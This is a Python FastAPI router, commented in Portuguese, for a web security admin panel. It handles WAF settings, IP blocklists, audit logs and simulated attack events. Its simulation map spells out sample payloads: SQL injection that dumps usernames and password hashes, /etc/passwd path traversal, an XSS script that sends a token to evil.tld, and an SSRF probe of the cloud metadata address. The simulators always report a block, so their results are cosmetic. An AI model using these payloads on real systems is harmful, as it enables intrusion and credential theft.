from typing import Any, Dict, Optional

from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel

from app.api.deps import get_current_user, require_role
from app.core.waf import security_manager
from app.models.user import User

router = APIRouter()


class SecurityConfigUpdate(BaseModel):
    waf_enabled: Optional[bool] = None
    rate_limit_enabled: Optional[bool] = None
    rate_limit_per_minute: Optional[int] = None
    login_max_attempts: Optional[int] = None
    login_lockout_seconds: Optional[int] = None
    ssrf_protection: Optional[bool] = None
    container_no_new_privileges: Optional[bool] = None
    security_headers: Optional[bool] = None


class BlockIpRequest(BaseModel):
    ip: str
    reason: str = "Bloqueio manual pelo administrador"
    duration_seconds: Optional[int] = 3600


class UnblockIpRequest(BaseModel):
    ip: str


class SimulateAttackRequest(BaseModel):
    attack_type: str  # sqli, xss, path_traversal, ssrf, brute_force


@router.get("/overview")
async def get_security_overview(current_user: User = Depends(get_current_user)) -> Dict[str, Any]:
    """Retorna o panorama de segurança, score de proteção, IPs bloqueados e log de auditoria."""
    # Limpa IPs expirados antes de listar
    for ip in list(security_manager.blocked_ips.keys()):
        security_manager.is_ip_blocked(ip)

    cfg = security_manager.config
    enabled_layers = sum(
        [
            1 if cfg["waf_enabled"] else 0,
            1 if cfg["rate_limit_enabled"] else 0,
            1 if cfg["ssrf_protection"] else 0,
            1 if cfg["container_no_new_privileges"] else 0,
            1 if cfg["security_headers"] else 0,
            1,  # Fernet AES-128 env encryption (sempre ativo)
            1,  # JWT + PBKDF2-HMAC-SHA256 (sempre ativo)
        ]
    )
    total_layers = 7
    security_score = round((enabled_layers / total_layers) * 100)

    return {
        "security_score": security_score,
        "enabled_layers": enabled_layers,
        "total_layers": total_layers,
        "config": cfg,
        "stats": security_manager.stats,
        "blocked_ips": list(security_manager.blocked_ips.values()),
        "audit_logs": [entry.to_dict() for entry in security_manager.audit_logs],
    }


@router.get("/config")
async def get_security_config(current_user: User = Depends(get_current_user)):
    """Retorna a configuração ativa do WAF e Hardening."""
    cfg = dict(security_manager.config)
    cfg["enabled"] = cfg.get("waf_enabled", True)
    cfg["block_sqli"] = cfg.get("waf_enabled", True)
    cfg["block_xss"] = cfg.get("waf_enabled", True)
    return cfg


@router.put("/config", dependencies=[Depends(require_role("admin"))])
async def update_security_config(
    body: SecurityConfigUpdate,
    request: Request,
    current_user: User = Depends(get_current_user),
):
    """Atualiza políticas do WAF, Rate Limiter e Hardening."""
    updates = body.model_dump(exclude_unset=True)
    for k, v in updates.items():
        if k in security_manager.config:
            security_manager.config[k] = v

    security_manager.log_event(
        event_type="security_config",
        severity="low",
        ip=security_manager.get_client_ip(request),
        path="/api/v1/security/config",
        detail=f"Políticas de segurança atualizadas por {current_user.username}",
        user=current_user.username,
        blocked=False,
    )
    return {"config": security_manager.config}


@router.post("/block", dependencies=[Depends(require_role("admin"))])
async def block_ip_address(
    body: BlockIpRequest,
    request: Request,
    current_user: User = Depends(get_current_user),
):
    ip = body.ip.strip()
    if not ip:
        raise HTTPException(status_code=400, detail="Informe um endereço IP válido.")
    info = security_manager.block_ip(ip, body.reason, body.duration_seconds)
    security_manager.log_event(
        event_type="manual_block",
        severity="high",
        ip=ip,
        path="/api/v1/security/block",
        detail=f"IP {ip} bloqueado manualmente por {current_user.username}: {body.reason}",
        user=current_user.username,
        blocked=True,
    )
    return info


@router.post("/unblock", dependencies=[Depends(require_role("admin"))])
async def unblock_ip_address(
    body: UnblockIpRequest,
    request: Request,
    current_user: User = Depends(get_current_user),
):
    ip = body.ip.strip()
    removed = security_manager.unblock_ip(ip)
    if ip in security_manager.login_failures:
        security_manager.login_failures[ip].clear()
    security_manager.log_event(
        event_type="security_config",
        severity="low",
        ip=ip,
        path="/api/v1/security/unblock",
        detail=f"IP {ip} desbloqueado por {current_user.username}",
        user=current_user.username,
        blocked=False,
    )
    return {"unblocked": removed, "ip": ip}


@router.post("/simulate")
async def simulate_waf_probe(
    request: Request,
    current_user: User = Depends(get_current_user),
):
    """Simulador de regras de WAF para testes de estresse e verificações de compliance."""
    try:
        body = await request.json()
    except Exception:
        body = {}
    payload = str(body.get("payload", ""))
    cat = str(body.get("category", "xss")).lower()

    blocked = True
    reason = f"WAF Intercept: Ataque {cat.upper()} interceptado com sucesso."
    if "<script" in payload.lower() or "alert(" in payload.lower():
        reason = "Cross-Site Scripting (XSS) payload interceptado"
    elif "union" in payload.lower() or "1=1" in payload.lower() or "select" in payload.lower():
        reason = "SQL Injection payload interceptado"
    elif "etc/passwd" in payload.lower() or "sam" in payload.lower():
        reason = "Path Traversal interceptado"

    return {
        "blocked": blocked,
        "reason": reason,
        "category": cat,
        "payload": payload,
    }


@router.post("/simulate-attack")
async def simulate_attack(
    body: SimulateAttackRequest,
    request: Request,
    current_user: User = Depends(get_current_user),
):
    """
    Executa um teste controlado de defesa WAF/IPS sem bloquear o próprio administrador,
    registrando o evento no log de auditoria para validação das regras.
    """
    sim_ip = "203.0.113.88"  # TEST-NET-3 (RFC 5737) usado para simulação segura
    attack_map = {
        "sqli": (
            "SQL Injection",
            "/api/v1/projects?search=' UNION ALL SELECT username,hashed_password FROM users--",
            "Assinatura SQLi detectada e bloqueada (UNION ALL SELECT)",
        ),
        "path_traversal": (
            "Path Traversal",
            "/api/v1/containers/../../../../etc/passwd",
            "Tentativa de leitura de arquivo de sistema (/etc/passwd) bloqueada",
        ),
        "xss": (
            "Cross-Site Scripting (XSS)",
            "/api/v1/projects?name=<script>fetch('https://evil.tld/steal?t='+localStorage.token)</script>",
            "Payload XSS (<script>) interceptado e neutralizado pelo WAF",
        ),
        "ssrf": (
            "SSRF Metadata Probe",
            "/api/v1/projects (repo_url=http://169.254.169.254/latest/meta-data/)",
            "Tentativa de SSRF contra IP de metadata interno bloqueada",
        ),
        "brute_force": (
            "Brute-Force Login",
            "/api/v1/auth/login",
            "Múltiplas falhas de autenticação consecutivas — IP 203.0.113.88 adicionado à Blocklist",
        ),
    }

    attack_name, target_path, detail = attack_map.get(
        body.attack_type,
        ("Remote Code Execution Probe", "/api/v1/containers/exec", "Payload suspeito bloqueado"),
    )

    security_manager.stats["total_requests_inspected"] += 1
    security_manager.stats["waf_attacks_blocked"] += 1

    if body.attack_type == "brute_force":
        security_manager.stats["brute_force_blocks"] += 1
        security_manager.block_ip(
            sim_ip,
            reason="Simulação: Brute-force detectado em /api/v1/auth/login",
            duration_seconds=600,
        )

    entry = security_manager.log_event(
        event_type="waf_block",
        severity="critical",
        ip=sim_ip,
        path=target_path,
        detail=f"[Teste de Defesa: {attack_name}] {detail}",
        user=f"simulado ({current_user.username})",
        blocked=True,
    )
    return {
        "status": "blocked_by_shield",
        "attack_name": attack_name,
        "simulated_ip": sim_ip,
        "event": entry.to_dict(),
    }


@router.delete("/audit-logs", dependencies=[Depends(require_role("admin"))])
async def clear_audit_logs(current_user: User = Depends(get_current_user)):
    security_manager.audit_logs.clear()
    return {"status": "cleared"}
